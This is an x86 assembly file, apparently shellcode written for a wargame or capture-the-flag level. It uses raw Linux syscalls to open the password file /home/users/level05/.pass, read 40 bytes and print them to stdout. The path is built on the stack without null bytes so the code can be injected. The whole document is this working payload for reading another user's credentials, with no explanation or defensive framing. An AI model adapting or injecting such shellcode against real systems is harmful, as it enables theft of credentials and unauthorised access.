;readpass.s

section .text
	global _start

_start:
	xor	eax, eax

	; /home/users/level05/.pass\0
	push	eax		; \0
	push	0x73736170	; pass
	push	0x2e2f3530	; 05/.
	push	0x6c657665	; evel
	push	0x6c2f7372	; rs/l
	push	0x6573752f	; /use
	push	0x656d6f68	; home
	push	0x2f2f2f2f	; ////

	mov	al, 5		; open
	mov	ebx, esp	; file
	xor	ecx, ecx	; read-only
	int	0x80

	mov	ebx, eax	; fd
	xor	eax, eax
	xor	edx, edx

	mov	al, 3		; read
	mov	ecx, esp	; buf
	mov	dl, 40		; size
	int	0x80

	xor	eax, eax
	xor	ebx, ebx
	xor	edx, edx

	mov	al, 4		; write
	mov	bl, 1		; stdout
	mov	ecx, esp	; buf
	mov	dl, 40		; size
	int	0x80

	xor	eax, eax
	xor	ebx, ebx
	mov	al, 1		; exit
	int	0x80
